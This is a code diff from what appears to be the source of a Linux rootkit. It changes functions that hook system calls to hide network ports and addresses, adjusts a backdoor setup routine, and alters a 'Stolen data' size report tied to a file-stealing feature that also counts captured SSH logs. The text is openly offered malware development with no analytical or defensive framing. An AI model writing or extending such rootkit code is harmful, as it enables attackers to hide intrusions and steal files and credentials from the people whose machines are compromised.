@@ -49,6 +49,9 @@ int preparedir(const char *path, gid_t magicgid){
 
 #ifdef HIDE_PORTS
 void preparehideports(gid_t magicgid){
+    if(rknomore())
+        return;
+
     hook(CFOPEN, CACCESS);
 
     if((long)call(CACCESS, HIDEPORTS, F_OK) == 0)
@@ -70,6 +73,9 @@ void preparehideports(gid_t magicgid){
 
 #ifdef HIDE_ADDRS
 void preparehideaddrs(gid_t magicgid){
+    if(rknomore())
+        return;
+
     hook(CFOPEN, CACCESS);
 
     if((long)call(CACCESS, HIDEADDRS, F_OK) == 0)
@@ -105,12 +111,6 @@ void bdprep(void){
         if(prepareregfile(curpath, magicgid))
             regs++;
     }
-#ifdef HIDE_PORTS
-    preparehideports(magicgid);
-#endif
-#ifdef HIDE_ADDRS
-    preparehideaddrs(magicgid);
-#endif
 
     if(regs+dirs != BDVPATHS_SIZE)
         printf("\e[1mIt looks like something may have went wrong setting everything up...\e[0m\n");
@@ -125,7 +125,7 @@ void bdprep(void){
         if(sshc>=0) printf("\e[1mSSH logs: \e[1;31m%d\e[0m\n", sshc);
 #endif
 #ifdef FILE_STEAL
-        off_t stolensize = getstolensize();
+        off_t stolensize = getdirsize(INTEREST_DIR);
         if(stolensize >= 0){
             printf("\e[1mStolen data: ");
             if(stolensize >= 1024*1024)
